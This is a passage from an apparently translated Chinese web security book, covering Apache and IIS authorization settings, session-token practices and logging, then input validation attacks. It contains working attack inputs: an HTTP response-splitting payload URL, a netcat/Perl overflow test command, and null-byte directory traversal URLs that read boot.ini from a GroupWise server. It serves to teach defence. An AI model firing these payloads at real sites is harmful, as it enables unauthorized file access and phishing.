也可以限制访问某些特定的 HTTP 命令。比如，HTTP 和 WebDAV 支持若干命令：GET，POST，PUT，DELETE，CONNECT，OPTIONS，TRACE，PATCH，PROPFIND，PROPPATCH，MKCOL，COPY，MOVE，LOCK 和 UNLOCK。WebDAV 命令提供了一些远程管理 Web 站点内容的方法。即使你允许 WebDAV 访问某个目录，也可以用“Limit”指令来控制这些命令。比如，只允许 GET 和 POST 请求到用户页面：

<Directory /var/www/htdocs>
Options -MultiViews -Indexes -Includes
Limit GET POST
Order allow, deny
Allow from all
/Limit
</Directory>

因此，当请求/htdocs 目录（Web 根目录）中的页面时，用户只能使用 GET 和 POST 命令。HEAD 命令总是和 GET 一起的。如果想要为某个特定目录开启 WebDAV 选项，你可以做如下设置：

<Directory /var/www/htdocs/articles/preview>

AuthType Digest
AuthName "Author Site"
AuthUserFile /etc/apache/passwd/users
AuthGroupFile /etc/apache/passwd/groups
Limit GET POST PUT CONNECT PROPFIND COPY LOCK UNLOCK
Require group author
/Limit
</Directory>

我们没有允许所有的 WebDAV 选项，但这对希望访问这部分 Web 应用程序的 author 组用户来说，已经足够了。

当访问控制基于 URL 时，使用的是 “Location” 指令。它并不对应一个特定文件位置：

<Location /member-area>
    AuthType Digest
    AuthName "My Application"
    AuthUserFile /etc/apache/passwd/users
    AuthGroupFile /etc/apache/passwd/groups
    Require valid-user
</Location>

<Directory> 标签中的指令所允许的内容几乎和<Location>标签中指令的一样。

##### IIS 授权

虽然控制粒度不一样，但  $ \Pi S $ 也为目录访问的类型提供了类似的安全选项。为了配置对 Web 目录和文件的访问控制，打开  $ \Pi S $ 管理工具（iisadmin.msc），定位到你想加固的计算机和目录，单击“属性”选项。在  $ \Pi S $ 5 上，会显示如图 5-11 所示的界面，这对包含静态 HTML 文件的目录是一个很好的默认选项设置。它只可读，不允许执行脚本，这对那些允许用户上传文件的目录是特别重要的。如果应用程序允许任意上传并执行文件，包含 ASP 文件，那么后果将非常严重。 $ \Pi S $ 6 的配置选项基本上是完全相同的。

IP 地址授权 虽然我们一般不推荐，但 IIS 也允许基于 IP 地址的访问控制。配置可以在目录安全选项卡中 Web 站点或目录的属性下访问到。这在只允许通过特定地址、子网或 DNS 名称访问管理员目录的情况下是有用的。但非常不推荐在面向因特网的应用程序中使用基于 IP 地址的访问控制，因为：第一，并不能保证连续的请求来自于同一个 IP 地址（考虑下 AOL 这类超大型代理）；第二，很多用户可以来自于同一个 IP 地址（想一下企业内部网）。

 </div>

#### 5.5.2 Web 授权/会话令牌安全

就像我们在本章中看到的那样，授权/会话安全是一个复杂的话题。下面是授权/会话管理技术最佳实践的大纲。

☐ 使用 SSL。任何包含敏感信息的网络流量都需要加密以防止嗅探攻击。

☐ 基于 RFC 2109。使用 SetCookie 响应头的 “Secure” 参数来标记 Cookie。

不要卷入自己的授权。我们会简短地讨论像 ASP.NET 和 PHP 的 Web 应用平台自带的授权功能。但是现成软件的授权功能，与甚至是最大的 Web 应用程序开发机构中的任何新开发的产品相比，都将会受到更多的实际考验。把安全问题留给专家，集中在你自己的核心业务上，这样做你的产品将面临更少的漏洞，相信我们吧。

不要在令牌中包含个人敏感信息。这样做除了避免会话劫持外（因为该数据常常不是真正秘密的——我们曾尝试过在 Google 上寻找某人的住址），还可以避免如果泄漏，用户丢失的就不仅仅是一些随机生成的会话 ID 了。攻击者可能已经窃取了他们的政府 ID，密码或其他任何用于生成令牌的信息。

- 一旦改变权限就要重新生成会话 ID。大部分 Web 应用程序对用户甚至是匿名用户在首次请求一个 URL 后，都赋予一个会话 ID。如果用户登录，应用程序应该给用

户创建并赋予一个新的会话 ID。这不仅仅代表着该用户已经认证过了，而且就算最初对应用程序的访问没有经过 SSL，也能减少窃听攻击的机会。这还可以减少本章前面讨论过的会话定置攻击。在这种攻击中，攻击者到一个站点获得会话 ID，然后 E-mail 给受害者，让他们使用该 ID 登录，而这个 ID 是攻击者已经知道了的。

强制会话时间限制，关闭重放攻击的窗口。在一段时间无交互（比如10分钟）或者一段固定的时间（比如30分钟）后，要使状态信息和会话ID无效。除了设置相关的每个会话的到期时间外，我们还推荐应用程序对会话长度设置全局绝对限制，来防止将会话ID到期时间延长到未来的攻击。总之永远要记住：应该由服务端注销ID或令牌信息，不应该依赖于客户端做这件事情。这可以阻止应用程序受到会话重放攻击。

- 强制限制并发登录。不允许用户对应用程序拥有多个同时认证的会话。这可以防止恶意用户劫持或者猜测合法的会话 ID。

##### 直接执行或模拟执行（Impersonate）

当涉及 Web 应用授权时，最重要的问题之一是：在什么样的安全（账号）上下文时，可以执行请求。该问题的答案几乎总是定义请求可以访问的资源（也叫做授权）。下面是一些简要背景知识，解释了这一经常被误解的概念。

就像我们在第 1 章中讨论的那样，Web 应用程序是基于客户端/服务器端（C/S）的。本质上，当受信任客户端发出请求时，对服务器来说有两个选项：

o 使用服务器自己的标识符执行请求(对 Web 应用程序来说, 这是 Web 服务器/后台);

☐ 通过模拟（impersonating）客户端（或者其他类似的权限身份）来执行请求。

在软件术语中，“模拟”的意思是服务器进程启动一个线程，给它客户端的身份（比如，把客户端的授权令牌加给新的线程）。该线程就可以以用户的身份访问本地服务器资源了，就像本章开头所介绍的简单授权模型那样。

注意 模拟的线程也可能对第一个服务器进行远程资源访问。Microsoft 将其命名为委派（delegation），这需要一个特殊的配置和更高的权限来实现。

Web应用程序使用刚才描述的两种选项，它取决于：第一，Web后台的类型和版本；第二，所发出的请求是访问一个文件系统对象还是启动一个服务器端的可执行程序（比如一个CGI或ISAPI应用程序）。比如，Microsoft的IIS总是对文件系统对象的访问进行模拟（无论是作为诸如IUSR_machinename的固定账号，还是作为客户端指定的认证账号）；而对于可执行文件，默认是不模拟，但也可以配置成模拟。另一方面，Apache对文件系统对象或可执行程序的请求都不模拟，而是在Web后台进程的安全上下文中执行所有的程序

(但有插件模块允许它通过 setuid/setgid 操作近似地模拟可执行程序)。

注意 因为 Web 应用授权几乎全都是通过 Web 服务器后台进程进行的, 所以要特别警惕 Web 后台进程中的绕过标准授权机制的漏洞, 比如 2001 年发现的 IIS Unicode 和双重解码问题。

在任何情况下，运行 Web 服务器、Servlet 引擎、数据库或者其他应用程序组件的用户账号，显然应该只拥有最低权限。我们在本章末尾的“参考和进一步阅读”一节中，列出了几篇文章的链接，它们描述了 IIS 和 Apache 默认情况下使用的账号以及该如何配置它们的细节。

URL 授权（AzMan）在 Windows Server 2003 中，Microsoft 提供了基于角色的访问控制（RBAC）特性，称为授权管理器（Authorization Manager，或者简写成 AzMan）。AzMan 针对在大型企业中 RBAC 的流行，允许他们使用相对简单的企业范围角色集来管理 ACL。IIS 可以通过启用叫做 URLauth.dll 的 ISAPI 过滤器来使用 AzMan。这提供了基于 IIS 6 应用程序到企业范围 RBAC 模型的集成。关于如何在 IIS 6 上实现 AzMan 的更多信息，请参见 IIS 文档，以及本章末尾的“参考和进一步阅读”一节。

ASP.NET 授权 微软有很多产品，但 IIS 是唯一在技术层面提供能构建复杂应用程序的技术。为了开发效果，那些决定部署 Microsoft 的 IIS Web 服务器产品的人，在实际中通常也部署微软的 Web 开发框架 ASP，现在被称为 ASP.NET，因为它被集成到微软更广泛的 .NET 编程平台中。

ASP.NET 提供了一些非常引人注目的授权选项，如果在这里列出详细的信息就太冗长了。我们强烈推荐使用本章末尾的“参考和进一步阅读”一节中的链接，查看文章“如何在 ASP.NET 2.0 中使用 Windows 认证”来理解 ASP.NET 提供的诸多可扩展的授权选项。

我们想对底层实现 ASP.NET 的开发者强调一点：如果你选择在你的 Web.config 文件 <identity>元素中指定认证/授权证书，应该使用 Aspnet_regiis.exe 工具（对应 ASP.NET 版本 2）或 Aspnet_setreg.exe 工具（对应 ASP.NET 版本 1.1）对它们进行加密。如何使用这些工具，在题为“How To: Encrypt Configuration Sections in ASP.NET 2.0”（如何在 ASP.NET 2.0 中加密配置部分）的文章中有深入的介绍，本章末尾的“参考和进一步阅读”中有该文章的链接。

#### 5.5.3 安全日志

另一个常被忽略的访问控制的对抗措施是安全日志。Web应用程序平台应该为操作系统和Web服务器生成日志。遗憾的是，仅有这些日志对识别恶意行为或重建可疑事件是远远不够的。特别是处理金融应用程序时，还有很多其他影响用户账号的事件应该被追踪：

○ 配置变更 记录重要的个人信息的改变，比如电话号码、地址、信用卡信息和 E-mail 地址。

- 密码变更 记录用户密码的更改。如果可能，用所知的正确的 E-mail 地址提醒用户（比如，Yahoo 就是这么做的）。

○ 修改其他用户 记录管理员对其他用户配置或密码的更改。当其他用户，比如服务台的员工更新其他用户的信息时，也应该做记录。一定要记录执行更改的账号和被改变的账号。

○ 添加/删除用户 记录从系统上添加和删除用户的操作。

应用程序的记录应该尽可能详细。当然，这需要在信息的数量和类型间保持平衡。比如，应该记录的基本项目是源 IP 地址、用户名或其他认证令牌、事件的日期和时间。为了识别针对用户令牌的假冒攻击，还应该记录会话 ID 信息。

记录下真正被改变的值未必是个很好的主意。应该以高度安全级别来对待日志，维持它们的完整性，但是如果日志要记录社会保险号码、信用卡号码和其他个人信息，那么它就会处于某种风险之中，比如来自内部员工的破坏，或者被恶意用户利用从中盗取数据库重要信息。

### 5.6 小结

在本章中，我们看到了典型 Web 应用程序授权模型很大程度上基于服务器端 ACL（通常在文件系统对象上）和授权/会话令牌（现成的或者定制开发的），而这些令牌对于一些常见攻击毫无抵制力。对于糟糕的 ACL 和令牌实现，利用常见的攻击技术，可以通过绕过、重放、欺骗、定置等手段操纵授权控制来伪装成其他用户，包括伪装成管理员。我们也描述了一些案例，说明了这些技术可以组合起来，在不同层次上破坏 Web 应用程序的授权。最后，我们讨论了 Web 管理员和开发者可以使用的工具集，以对抗我们讲述过的大部分基本攻击技术，而且讨论了一些更广泛的深度防御策略，可以有助于加固典型 Web 应用程序的整体安全性。

### 5.7 参考和进一步阅读

David Endler 的 “暴力破解 Web 应用 http://downloads.securityfocus.com/会话 ID.”

library/SessionIDs.pdf

ACROS Security 的“Web 应用程序中 http://www.acros.si/papers/session_的会话定制漏洞” fixation.pdf

基于角色的访问控制 http://csrc.nist.gov/rbac/

PHP 安全 http://www.php.net/manual/

security.php

Apache 授权/认证资源

Apache 2.2 认证、授权和访问控制

http://httpd.apache.org/docs/2.2/

howto/auth.html

http://httpd.apache.org/docs/1.3/

suexec.html

IIS 授权/认证资源

MSDN 的 “IIS 授权”

http://msdn.microsoft.com/library/

default.asp?url=/library/en-us/vsent7/

html/vxconIISAuthentication.asp

http://support.microsoft.com/?kbid=264921

http://support.microsoft.com/kb/324274/

IIS 如何认证浏览器客户端

如何在 Windows Server 2003 上配置

IIS Web 站点认证

HTTP 的 NTLM 认证机制

如何在 ASP.NET 2.0 上使用 Windows

认证

(较全面地覆盖了授权的技术)

如何在 ASP.NET 2.0 上保护表单认证

http://www.innovation.ch/personal/ronald/ntlm.html

http://msdn.microsoft.com/library/

default.asp?url=/library/en-us/

dnpag2/html/paght000025.asp

http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnpag2/html/paght000025.asp

如何在 ASP.NET 2.0 上加密配置部分

http://msdn.microsoft.com/library/

default.asp?url=/library/en-us/

dnpag2/html/paght000005.asp

如何在 ASP.NET 2.0 上使用 RSA 加密配置部分

http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnpag2/html/paght000006.asp

Microsoft 授权管理器（AzMan）白皮

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>书</td><td style='text-align: center; word-wrap: break-word;'>prodtechnol/windowsserver2003/</td></tr><tr><td rowspan="4">.NET ViewState 概述</td><td style='text-align: center; word-wrap: break-word;'>technologies/management/ athmanwp.mspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>http://msdn.microsoft.com/library/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>default.asp?url=/library/en-us/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>dnaspnet/html/asp11222001.asp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>工具</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Offline Explorer Pro</td><td style='text-align: center; word-wrap: break-word;'>http://www.metaproducts.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WebScarab</td><td style='text-align: center; word-wrap: break-word;'>http://www.owasp.org/software/Webscarab.html</td></tr><tr><td rowspan="2">SPI Dynamics 的 SPI 工具集</td><td style='text-align: center; word-wrap: break-word;'>http://www.spidynamics.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>products/Webinspect/toolkit.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Cookie</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RFC 2109, “HTTP 状态管理机制”</td><td style='text-align: center; word-wrap: break-word;'>http://www.ietf.org/rfc/rfc2109.txt</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>(Cookie RFC)</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>详细分析 Cookie 的论文，重点讨论</td><td style='text-align: center; word-wrap: break-word;'>http://cookies.lcs.mit.edu/pubs/Webauth:sec10.pdf</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>认证上</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CookieSpy</td><td style='text-align: center; word-wrap: break-word;'>http://www.codeproject.com/shell/ cookiespy.asp</td></tr></table>

## 第 6 章 输入验证攻击

输入验证是 Web 应用程序安全防范的首道防线。许多攻击，如 SQL 注入，脚本攻击（包括了跨站脚本），以及详细错误信息的泄漏，都是由于攻击者向程序提交了未曾预料到的输入类型而造成的。

输入验证就是为了确保输入数据的格式和类型都是程序所需的。如果不进行严格的检查以减少误操作，程序的完整性和它的信息就有可能会受到损害。

想象一个应用程序中的购物车，我们考虑其信用卡字段。首先，信用卡号码只包含数字；其次，大多数信用卡号码都是16位的数字，但也有一些是小于16位的。因此，如果进行输入验证，第一项应该是长度检查：输入的数据是否为14~16位的字符；第二项检查应该是内容检查：输入的数据是否含非数字的字符。我们可以在系统中加上另一项检查：输入的数据是否是一个合法的信用卡号码。“0000111122223333”显然不是一个信用卡号码，但“4435786912639983”呢？我们写一个简单的校验和程序就可以判断一个16位数字是否符合合法的信用卡号码要求。另外，一些常识性知识也可以用来验证，比如，一个15位的信用卡号码应该以3开头，第二位应该为4或者7。这个信用卡的例子演示了如何测试输入为一串数字的合法性。但请注意，这个例子没有尝试判断信用卡号码是否匹配用户名或用户地址，而只是尝试验证号码本身的合法性。本章内容着重于两点：一是完全信任用户提供的数据会带来的危险；二是如果没有恰当的限制期望的数据类型，攻击者攻击应用程序各种的方法。

数据验证可能会非常的复杂，但它却是应用程序安全基础中的基础。应用程序的开发者应该事先预料到用户在表单字段中所有可能的输入值。刚才我们提到了验证信用卡号码的三种简单方法：长度、内容和校验和。这样的验证过程可以放在 HTML 页面中，以 JavaScript 实现，并运行在 SSL 之上。基于 JavaScript 的解决方案非常简单，也的确是开发人员最常使用的方法之一。但在接下来的几节里，我们将会看到，客户端的输入验证可以被绕过，而 SSL 只是起到保护 Web 传输的保密性。换句话说，我们不能信任 Web 浏览器所做的安全检查工作，通过 SSL 加密连接不会对提交到应用程序的数据内容造成任何的影响。

### 6.1 预料意外的情况

输入验证最大的一个安全漏洞就是将验证流程用 JavaScript 实现并放在浏览器中。使用客户端的脚本语言实现验证流程似乎是合情合理的，原因首先是验证流程不必在服务端实现；其次是，客户端验证容易实现且被大多数 Web 浏览器支持（虽然也有很个别的浏览器不支持）；更重要的是，这样就把服务端所要做的大量工作移到了客户端，是应用程序的一种成功。但 Web 浏览器是不可信、不可控的环境，所有传入传出的数据都可在传输途中被修改，不管是否存在输入验证流程。因此，用于购买新的 Web 服务器来处理服务端输入验证的支出，远远小于恶意用户使用 %0a 的小手段来损害到应用程序安全带来的代价。

输入验证的攻击可能针对应用程序的不同方面。理解黑客如何攻击不完整的验证流程是非常重要的，因为他们带来的危险远不只“垃圾数据”错误那么简单。

数据存储：包括 SQL 注入攻击中使用的字符。这些字符可以改写数据库查询语句，导致执行攻击者定制的行为。产生的错误能泄漏出各种信息，比如应用程序采用的编程语言，甚至是应用程序发送到数据库的具体 SQL 查询语句。

- 冒充其他用户：包括跨站脚本以及与“钓鱼”相关的攻击。攻击者可以通过提交数据改写 HTML，从而窃取其他用户的信息，或者引诱用户泄露他们的敏感信息。

- 控制 Web 服务器：此类攻击因操作系统不同而不同。比如插入分号，能在 UNIX 的 Web 服务器上执行任意指令。应用程序本来要在 Web 服务器上执行命令，但通过特殊的字符，可以欺骗它执行其他的命令。

泄露应用程序内容：攻击者能通过产生的错误来泄露程序的语言信息。其他攻击方法也可以绕过浏览器对文件类型的限制。比如许多 Nimda 蠕虫的变种，使用了斜线（用来分隔目录）其他的编码方式来绕过 IIS 的安全检查，从而可以访问 Web 根目录以外的文件。

- 缓冲区溢出攻击：缓冲区溢出攻击已经困扰着程序多年了，Web 应用程序也不例外。此类攻击包括向一个变量或者字段中填充尽可能多的字符，然后观察其结果。这样可能会导致应用程序崩溃或者停止执行任意命令。缓冲区溢出更多在编译语言，如 C 或 C++ 中，被关注，而在 Perl 或 Python 等解释性语言中则很少注意。基于 .NET 和 Java 的 Web 平台，由于不允许程序员直接操纵堆栈和堆分配（这是缓冲区溢出的条件），从而导致应用层面的缓冲区溢出非常困难。缓冲区溢出可能会在特定的语言平台上长期存在。

获得任意数据的访问权限：一个用户可以访问另一个同级用户的信息，比如一个顾客可以查看另外一个顾客的账单信息；一个用户可以访问某些特权数据，比如匿名

用户能够枚举、创建或者删除用户。数据访问同样适用于受保护的文件或程序中的管理员领域。

### 6.2 在哪里寻找攻击载体

每一个 GET 和 POST 的参数都可以用来做输入验证攻击，更改参数，不管它们来自表单还是应用程序，都是一项很细微的工作。最易被攻击的点是输入字段。通常这些字段包括登录名、密码、地址、电话、信用卡号以及搜索，其他使用下拉菜单的字段也不应该被忽略。第一步需要枚举出这些字段以及它们大概的输入类型。

不要错误地认为输入验证攻击的目标只能是用户需要完成填写的字段，事实上，GET 和 POST 请求的任何变量都有可能被攻击。对一个很有价值的目标，攻击者在攻击前会深入全面的调查程序的文件、参数和表单字段。

Cookie 是另一类攻击目标。Cookie 本来包含了用户不能故意操纵的值，但也有可能被用于 SQL 注入或冒充其他的用户。

Cookie 只是一种特殊的 HTTP 头。事实上，任何 HTTP 头都是输入验证攻击的载体。HTTP 响应头截断是另一种以 HTTP 头为攻击目标的例子，它将正常地响应截断，注入伪造的头部集（通常是 Cookie 或控制缓存，会给客户端带来很大的破坏）。

让我们仔细分析一下 HTTP 响应头截断攻击。攻击的目标是使用参数作为转向指示的程序。例如，一个存在潜在漏洞的 URL 如下：

http://Website/redirect.cgi?page=http://Website/welcome.cgi

一个很好的输入验证流程需要确认 page 参数的值是一个合法的 URL。但如果可以包含任意的字符，那么参数可以被改写为如下的样子：

http://Website/redirect.cgi?page=0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3chhtml%3eHello, world!%3c/html%3e

Page 原来的值被一串字符所替换了, 这些字符模拟了来自一个 Web 服务器的 HTTP 响应头, 包括了一个简单的 HTML 字符串 “Hello, world!”。将编码后的字符替换掉, 恶意载荷就更容易理解了:

Content-Type: text/html
HTTP/1.1 200 OK
Content-Type: text/html
<html>Hello, world余人</html>

最终的攻击结果是浏览器显示了伪造的 HTML 内容，而不是期望转向的网页。这个例子似乎并无破坏作用，但恶意攻击可以包含 JavaScript 等内容，使其看起来需要用户提交密码、社会保险号、信用卡信息或其他敏感信息。这里不是要讨论如何构造有效的钓鱼攻击，而是想说明参数的内容可以被操纵，而且会产生意想不到的效果。

### 6.3 绕过客户端验证

如果程序的输入验证只采用了基于 JavaScript 的方法，那么这个程序远没有想象中的安全。客户端的 JavaScript 基本上是都可以被绕过的。一些个人代理、个人防火墙以及 Cookie 管理软件都吹嘘它们可以过滤掉网站弹出窗口和其他入侵组件。其实很多计算机专家也完全关闭 JavaScript，以防止受到最新 E-Mail 病毒的攻击。总而言之，有很多的理由和简单的方法让 Internet 用户禁用 JavaScript。

当然，禁用 JavaScript 会使很多应用程序不完整。不过现在有很多的工具可以移除 JavaScript 或允许我们在 JavaScript 检查后提交内容。使用一个像 Paros 的代理，我们就可以在 GET 或 POST 请求发送到服务器之前将其截获，以这种方式可在浏览器中输入能通过验证的数据，而在代理中将数据改变为任意值。

### 6.4 常见的输入验证攻击

让我们看一下常见的输入验证攻击。虽然大多数攻击只是向程序倾倒垃圾数据，但也有一些攻击含有精心构造的字符串。在本章中，我们只是展示一下可能被攻击的漏洞，而把具体的攻击细节放在其他章节中讲解。例如，SQL 注入攻击也是输入验证攻击，但我们会在第 8 章中再详细讨论。

#### 6.4.1 缓冲区溢出

缓冲区溢出很少会在解释性或高级编程语言中产生。比如，使用 PHP 或 Java 语言编写的程序，产生漏洞的可能性就很小。但还是有可能发生的，比如使用了某种语言的自带函数，而这个函数本身就含有缓冲区溢出漏洞。不过，还是建议把精力放在其他输入验证，Session 管理和其他的 Web 安全方面。当然，如果程序包含了自己编写的 IIS 的 ISAPI 接口或 Apache 模块，那么还是需要进行缓冲区溢出的检查，或者进行更高效的代码安全评审。

实现缓冲区溢出攻击，只需要在一个输入字段中输入尽量多的数据，这是一种非常暴力和野蛮的攻击，但如果程序返回了一个错误，那么攻击就起作用了。Perl 非常适合做这

种类型攻击，只需要一条指令就可以对一个参数产生任意长度的攻击。

$ perl -e 'print "a" x 500'
aaaaaaa...重复500次

可以通过 Perl 脚本产生 HTTP 请求（使用 LWP 模块），或者使用 Netcat 产生输出。当然不是用它们来提交正常的参数，而是用把参数替换成嵌入的 Perl 语句的输出。比如一个正常的请求如下：

$ echo -e "GET /login.php?user=faustus\nHTTP/1.0\n\n" | \
nc -vv Website 80

而在命令行中调用 Perl 进行缓冲区测试的例子如下:

$ echo -e "GET /login.php?user=\
> `perl -e 'print "a" x 500'\\nHTTP/1.0\n\n" | \
nc -vv Website 80

这里向 login.php 发送了长达 500 个 "a " 的 user 值。这条语句可在任何类 UNIX 的环境（或 Cygwin）下执行，而和 curl 程序结合起来使用，还可以减少 SSL 所带来的问题，如：

当使用不同的负载和不同的长度进行缓冲区溢出测试时，目标程序会返回不同的错误。这些错误可能全部是“密码错误”，但也可能有一些会提示 user 参数的边界情况。缓冲区测试的首要原则是使用基本的差异分析或异常检测，其步骤如下：

1\. 向应用程序发送一个正常的请求并记录服务器的响应;

2．向应用程序发送第一个缓冲区溢出测试数据，记录服务器此时的响应；

3. 向应用程序发送下一个测试数据并记录服务器响应；

4. 重复第 3 步。

当发现服务器的响应不同于对一个“正常”请求的响应时，就检查有哪些差别，这将帮助你跟踪到那些能产生错误的特定载荷（比如在 URL 中，7809 个斜杠是可以接受的，但 7810 个就不可接受）。

在某些情况下，缓冲区溢出攻击能够使攻击者在服务器上执行任意指令。编写这样的缓冲区溢出利用工具比较困难，但使用起来则非常简单。换句话说，发现漏洞需要非常有经验的安全审核人员，但初级的攻击者也能够下载到和使用预先编写好的攻击工具。

注意 大多数时候，缓冲区溢出攻击都是“盲目”的，如果没有权限对应用附加调试器，或者查看日志或系统信息，构造出可执行任意命令的缓冲区溢出代码将是件非常困难的工作。比如，IIS 上的 FrontPage Services Extension 溢出漏洞，如果没有对系统完全的访问权限，就不能被利用而构成缓冲区溢出攻击。

#### 6.4.2 转义攻击

这类攻击的目标是 Web 服务器上的模板或其他可供入侵参考的文件。此类攻击的基本模式是跳出 Web 文档的根目录，从而能访问系统文件，比如，“.../.../.../.../.../.../.../boot.ini”就期望访问到服务器上的 boot.ini 文件。目前的服务器如 IIS 和 Apache 都能够阻止这样的攻击，但 IIS 在进行 URL 字符解码和目录遍历安全检查时，产生的逻辑问题会导致受到此类转义攻击。两个著名的例子就是 IIS 过度解码漏洞（..%255c..）和 IIS Unicode 目录遍历漏洞（..%c0%af..）。关于这两个漏洞更多的信息，可以访问微软公司的网站：

 </div>

 </div>

一个 Web 应用程序的安全性决定于最薄弱的那块木板。即使一个健壮的 Web 服务器，也会因一个不安全的应用程序而受到攻击。最容易受到转义攻击的地方，是使用了服务器上模板文件或解析文件的应用程序，如果应用程序没有限制可以访问的文件类型，那么攻击者可以轻易地跳出 Web 根目录。此类漏洞只与设定的 URL 有关，与使用的语言和服务器平台无关。下面是可能会受到攻击的几个 URL 例子：

/menu.asp?dimlDisplayer=menu.html
/Webacc?User.html=login.htt
/SWEditServlet?station_path=Z&publication_id=2043&template=login.tem
/Getfile.asp?/scripts/Client/login.js
/includes/printable.asp?Link=customers/overview.htm

如果 Web 应用程序没有验证所请求文件的位置和内容，那么此类攻击很容易成功。比如，一个基于 Novell 的 Web 应用程序 Groupwise，其登录页面 URL 含有 “/servlet/Webacc?User.html=login.htt”，那么可以通过伪造 User.html 参数来攻击，比如构造成：

" /servlet/Webacc?User.html=.../.../WebAccess/Webacc.cfg%00"

就可以使我们跳出 Web 根目录，进入到配置文件目录中。这样，突然间登录页面变成了 Web 服务器，但我们其实根本没有登录过。

注意 现在，许多嵌入式设备，媒体服务器和网络连接设备，都带有基础的 Web 服务器。例如供家庭使用的路由器和无线接入点。当遇到这样的服务器时，可以试一试 URL 的目录遍历，此类应用程序对安全性的重视程度，往往远远低于对程序的大小和性能的重视，所以，说不定会有意想不到的效果。

##### 高级目录遍历

让我们仔细看一看 Groupwise 这个例子。一个正常的 HTTP 请求将返回 login.htm 如下

的内容:

<HTML>
<HEAD>
<TITLE>GroupWise WebAccess Login</TITLE>
</HEAD>
<!login.htm>
...页面的其他内容省略掉了...

值得注意的是，Webacc 的 servlet 将参数 login.htt 作为 HTML 文件显示，这表明了程序会载入和显示 User.html 参数提供的文件名。如果 User.html 参数收到了一个实际不存在的文件名，那么就会发生错误，通常情况下，这些错误会给我们一些有用的信息。比如，下面一个利用 URL 进行攻击的例子，输入 URL: http://Website/servlet/Webacc?user.html=nosuchfile，将会产生如下错误信息：

File does not exist: c:\Novell\java\servlets\com\novell\Webaccess\templates/nosuchfile/login.htt
Cannot load file: c:\Novell\java\servlets\com\novell\Webaccess\templates/nosuchfile/login.htt.

这个错误信息泄漏了应用程序安装的绝对路径。另外，我们发现了 User.html 参数所指定的值（nosuchfile），会被认为是目录文件夹，程序会在之下寻找 login.html 文件。这非常有意思，说明如果没有提供 User.html 参数，程序将会使用默认的模板。但由于程序总是会访问 login.html 文件，这成为了目录遍历攻击的一个障碍。为了绕开它，我们使用古老的对付 Perl 语言编写的 Web 程序的方式：NULL 字符。比如：

http://Website/servlet/Webacc?user.html=.../.../.../.../.../
boot.ini%00
[boot loader]
timeout=30
default=multi(0) disk(0) rdisk(0) partition(5) \WINNT
[operating systems]
multi(0) disk(0) rdisk(0) partition(5) \WINNT="Win2K" /fastdetect
C:\BOOTSECT.BSD="OpenBSD"
C:\BOOTSECT.LNX="Linux"
C:\CMDCONS\BOOTSECT.DAT="Recovery Console" /cmdcons

注意，虽然应用程序总是会在 User.html 输入的参数后面加上 login.htt，但我们还是成功地获得了 Windows 的 boot.ini 文件。这个技巧是在参数后面加上了一个 “%00”。%00 是 NULL 字符的 URL 编码方式。NULL 字符在类 C 的语言文字符串变量中使用时具有特殊的含义。在 C 语言中，字符串用一个任意长的字符数组表示，为了标明字符串的结束位置，

以特殊的字符——NULL 字符作为字符串的结束标记。因此，这个例子里，Web 应用将原始的 user.html 参数传递给了程序，也包括了其中的 %00。当 servlet 分析参数时，它照例在末尾附加上 login.htt，成为如下的样子：

.../.../.../.../.../.../boot.ini%00login.htt

Perl 类的编程语言将 NULL 字符一起作为整个字符串的一部分，不将其作为定界符。但是，操作系统是采用 C（或者 C++ 混合）编写的，当 Perl 或 Java 在操作系统中对文件进行操作时，必定会接触到 C 语言编写的函数。即使 Perl 或 Java 中将带有 NULL 字符的字符串传递给操作系统，操作系统将遍历字符串，直到遇到 NULL 字符为止，%00 后面的 login.htt 就被忽略了。再看下整个流程：Web 服务器将 %xx 作为十六进制解码，%00 首先被 Web 服务器转换为 NULL 字符（0x00），然后传递给应用程序（这个例子是用 Perl 语言写的），Perl 将 NULL 字符也作为参数的一部分，而 C 语言处理时，又会将后面的字符截断。

提示 其他一些用 Unicode 的字符编码方式，也可能会给程序带来类似的效果。IIS 过度解码漏洞，就是使用另一种 Unicode 编码后的字符替代斜线字符而产生的。

迫使一个程序访问任意文件，有多种类似%00的方法，下面是一些技巧：

°.././file.asp%00.jpg 这种可以对进行后缀名检查的程序使用，比如程序要求满足某种图像文件的后缀（.jpg 或.gif）。

° //./file.asp%0a    %0a 是换行符，作用和 NULL 字符类似，当输入验证过滤了%00 字符却未剥去其他恶意载荷时，这种方法能奏效。

◦ /valid_dir/.../.../file.asp 适用于程序验证文件的基本名的情况。它必定在一个合法的目录中。但如果没有去掉目录遍历字符，攻击者可以轻易地跳出该目录。

valid_file.asp...//...//file.asp 适用于程序会验证部分文件名的情况。

° %2e%2e%2f%2e%2e%2e%2ffile.asp（../file.asp） 适用于应用程序在 URL 解码前进行名称验证，或者对 URL 解码后的验证较弱的情况。

##### 无目录列表的浏览

转义攻击允许浏览 Web 目录内部以及外部的文件，但由于不能产生目录列表，浏览起来还是比较困难。但是，我们可以使用一些技巧，使得枚举文件变得简单。第一步要知道实际的根目录从哪里开始，Windows 系统中是分区的盘符，UNIX 系统中通常是根目录“/”，IIS 使这项工作变得更简单，它默认最上层目录是 “InetPub”。例如，为了寻找到 IIS 的根目录（或驱动盘符），我们不断地跳到上层目录，直到成功地获取目标 HTML 文件。下面是一个寻找到目录应用程序 default.asp 文件的根目录简短例子。

